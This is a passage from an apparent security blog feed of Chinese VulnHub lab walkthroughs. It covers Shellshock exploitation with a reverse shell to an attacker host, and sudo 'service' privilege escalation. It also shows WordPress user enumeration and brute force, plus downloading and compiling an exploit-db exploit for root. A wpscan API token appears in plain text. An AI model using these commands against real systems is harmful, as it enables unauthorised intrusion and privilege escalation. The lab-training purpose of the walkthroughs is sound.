&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-427.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;先对目标网站进行目录扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.115/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-428.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1L1JFQURNRS5tZA==&#34;&gt;http://192.168.31.115/README.md&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-429.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 管理员的用户名是 “admin”，密码是 “password123”。&lt;/p&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1L2luZGV4LnBocA==&#34;&gt;http://192.168.31.115/index.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-430.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 输入用户名和密码之后，显示登录失败，可能此密码在其他地方才能登陆&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-431.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1L2FkbWluX2xvZ2luLnBocA==&#34;&gt;http://192.168.31.115/admin_login.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-432.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功登陆到对方网站的后台&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-433.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sql-注入测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入测试&#34;&gt;#&lt;/a&gt; SQL 注入测试&lt;/h3&gt;
&lt;p&gt;翻了翻目录没有什么新的发现&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-434.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试对登陆的地方进行注入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-435.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对登陆的地方进行 burp 抓取数据包&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-436.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;复制数据包，用 sqlmap 测试发现没有注入点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-437.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;cgi-bin-漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cgi-bin-漏洞&#34;&gt;#&lt;/a&gt; cgi-bin 漏洞&lt;/h3&gt;
&lt;p&gt;扩大信息收集面，用 dirb 收集更多的目录结构&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-438.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对收集到的 cgi-bin 目录进行更深一级的搜寻&lt;br&gt;
 &lt;code&gt;dirsearch -u http://192.168.31.115/cgi-bin/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-439.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 敏感目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1L2NnaS1iaW4vc2hlbGwuc2g=&#34;&gt;http://192.168.31.115/cgi-bin/shell.sh&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-440.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接上谷歌搜索 cgi-bin 的漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-441.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了测试 shellshock 的的命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-442.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh 192.168.31.115&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-443.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 确定了此端口存在 CVE-2014-6271 这个漏洞&lt;/p&gt;
&lt;h3 id=&#34;msf-攻击-shellshock&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf-攻击-shellshock&#34;&gt;#&lt;/a&gt; msf 攻击 shellshock&lt;/h3&gt;
&lt;p&gt;利用 msf 寻找此漏洞进行利用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-444.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;search CVE-2014-6271&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/http/apache_mod_cgi_bash_env_exec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /cgi-bin/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-445.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到网站反弹的 shell&lt;/p&gt;
&lt;h3 id=&#34;searchsploit攻击shellshock&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#searchsploit攻击shellshock&#34;&gt;#&lt;/a&gt; searchsploit 攻击 shellshock&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;searchsploit shellshock&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-446.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;searchsploit -x linux/remote/34900.py&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-447.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;cp /usr/share/exploitdb/exploits/linux/remote/34900.py .&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;python 34900.py&lt;/code&gt; &lt;br&gt;
 查看此 exp 是如何利用的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-448.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;根据提示，写全命令行进行攻击&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./34900.py payload=reverse rhost=192.168.31.115 lhost=192.168.31.135 lport=5555 pages=/cgi-bin/shell.sh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-449.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到反弹后的 shell&lt;/p&gt;
&lt;h3 id=&#34;pspy64s-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy64s-监控&#34;&gt;#&lt;/a&gt; pspy64s 监控&lt;/h3&gt;
&lt;p&gt;翻阅目录，查找到一个备份文件，猜测此备份由高权限执行，直接上 pspy 进行监控&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-450.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 pspy 从 kali 机器上下载下来，赋予 x 权限，然后执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-451.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;等待监控是否执行了一些特殊命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-452.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 遗憾的是并没有执行什么特殊任务，不能进行提权&lt;/p&gt;
&lt;h3 id=&#34;service-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#service-提权&#34;&gt;#&lt;/a&gt; service 提权&lt;/h3&gt;
&lt;p&gt;收集服务器的相关信息，sudo -l 确定了可以调用 thor 去执行一个脚本&lt;br&gt;
 &lt;code&gt;sudo -u thor /home/thor/./hamer.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输入 bash 后反弹出来了一个 thor 用户的 shell&lt;br&gt;
 &lt;code&gt;python3 -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-453.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;sudo -l 查看 thor 的权限设置，发现其可以直接无密码调用 root 的 service&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v&#34;&gt;https://gtfobins.github.io/&lt;/span&gt; 上找到了 service 的提权命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;service 提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo service ../../bin/sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-454.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功最终拿到了 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/120%20BEELZEBUB/</id>
        <title>VULNHUB 20 BEELZEBUB</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/120%20BEELZEBUB/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmVlbHplYnViLTEsNzQyLw==&#34;&gt;https://www.vulnhub.com/entry/beelzebub-1,742/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2NzkwNjcuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15679067.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 BEELZEBUB：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-455.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.102&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.102&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-456.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAy&#34;&gt;http://192.168.31.102&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-457.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.102&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.102&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-458.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocG15YWRtaW4vZG9jL2h0bWwvaW5kZXguaHRtbA==&#34;&gt;http://192.168.31.102/phpmyadmin/doc/html/index.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-459.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocG15YWRtaW4v&#34;&gt;http://192.168.31.102/phpmyadmin/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-460.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocGluZm8ucGhw&#34;&gt;http://192.168.31.102/phpinfo.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-461.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并没有发现可以直接利用的漏洞，用 dirb 做更深的目录结构扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-462.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 还是没有什么发现&lt;/p&gt;
&lt;h3 id=&#34;源代码信息检索&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#源代码信息检索&#34;&gt;#&lt;/a&gt; 源代码信息检索&lt;/h3&gt;
&lt;p&gt;对已经存在的网址进行源代码的审查: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL2luZGV4LnBocA==&#34;&gt;http://192.168.31.102/index.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-463.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;猜测这句话的意思是原本存在目录结构为 beelzebub 的目录，为了防止被攻击，将此目录结构以 md5 加密，所以会有一个 beelzebub 的 md5 加密后的目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-464.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;判断猜测是否正确，搜寻此目录下是否存在其他文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.102/d18e1e22becbd915b45e0e655429d487&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-465.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;根据目录结构中的许多关键词如 wp 可以判断出这是一个二级 wordpress 站点&lt;br&gt;
 wp-login.php 进入到登陆界面，发现一直在转圈&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-466.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wpscan-强制扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-强制扫描&#34;&gt;#&lt;/a&gt; wpscan 强制扫描&lt;/h3&gt;
&lt;p&gt;通过 wpscan 工具来对网站进行一波用户名的枚举&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ --e&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-467.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;wpscan 扫描失败，根据提示加上对应的参数扫描&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ --enumerate u --ignore-main-redirect&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-468.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;wpscan 扫描仍然失败，提示的是未检测到此 CMS，加 force 强制扫描&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487 --enumerate u --ignore-main-redirect --force&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-469.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 开始正常扫描，枚举出了两个用户名 valak 和 krampus&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-470.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过已有的用户名来爆破密码&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ -U &#39;valak,krampus&#39; -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --ignore-main-redirect --force&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-471.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 密码破解失败，无法获取到密码，将从其他 url 地址上寻找突破&lt;/p&gt;
&lt;h3 id=&#34;cookie-密码泄漏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cookie-密码泄漏&#34;&gt;#&lt;/a&gt; cookie 密码泄漏&lt;/h3&gt;
&lt;p&gt;继续访问前边扫描到的 url 地址，看是否有可疑目录&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL2QxOGUxZTIyYmVjYmQ5MTViNDVlMGU2NTU0MjlkNDg3L3dwLWNvbnRlbnQvdXBsb2Fkcy8=&#34;&gt; http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-472.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL2QxOGUxZTIyYmVjYmQ5MTViNDVlMGU2NTU0MjlkNDg3L3dwLWNvbnRlbnQvdXBsb2Fkcy9UYWxrJTIwVG8lMjBWQUxBSy8=&#34;&gt;http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk To VALAK/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-473.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到一个可以输入语句的对话框，在这里输入个用户名试试什么效果&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-474.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;输入用户名后，网站的 cookie 信息中爆出来了一个密码；切换用户，输入 krampus 用户，查看到了他的密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-475.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; valak：M4k3Ad3a1 krampus：M4k3Ad3a1&lt;/p&gt;
&lt;p&gt;用 ssh 尝试这两个用户的登录名和密码，进入服务器&lt;br&gt;
 &lt;code&gt;ssh 192.168.31.102 -l valak&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;ssh 192.168.31.102 -l krampus&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-476.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 krampus 的权限，进入到了服务器&lt;/p&gt;
&lt;h3 id=&#34;bash_history-查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bash_history-查看&#34;&gt;#&lt;/a&gt; .bash_history 查看&lt;/h3&gt;
&lt;p&gt;cat ~/.bash_history 查看历史命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-477.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到之前有操作过这些命令，很有可能就是提权命令，复现此 exp&lt;br&gt;
 &lt;code&gt;wget http://www.exploit-db.com/download/47009&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-478.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用exp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv 47009 ./exp.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc exp.c -o exp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./exp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-479.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功，拿到了 root 账户的权限&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/118%20JANGOW/</id>
        <title>VULNHUB 18 JANGOW</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/118%20JANGOW/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvamFuZ293LTEwMSw3NTQv&#34;&gt;https://www.vulnhub.com/entry/jangow-101,754/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t1a3VkZXNodW8vYXJ0aWNsZS9kZXRhaWxzLzEyMjk3NzkxNw==&#34;&gt;https://blog.csdn.net/kukudeshuo/article/details/122977917&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 JANGOW：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-388.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;不同的设备会表现出不同的 MAC 地址，这里没有显示出两个相同的 MAC 地址，不好判断哪个才是真正的靶机地址&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;确认承载靶机的win机器的MAC地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ipconfig /all | find “物理地址”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-389.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过比较上述两个图可以发现 A0-D3-7A-07-9E-8C 是 win 机器的 MAC 地址，而位于 win 机器上的靶机应该跟 win 主机享有同样的 MAC 地址，因此可以确定目标靶机的 ip 地址为 27&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.27&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-390.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21, 80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjc=&#34;&gt;http://192.168.31.27&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-391.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;先对目标网站进行目录扫描&lt;/p&gt;
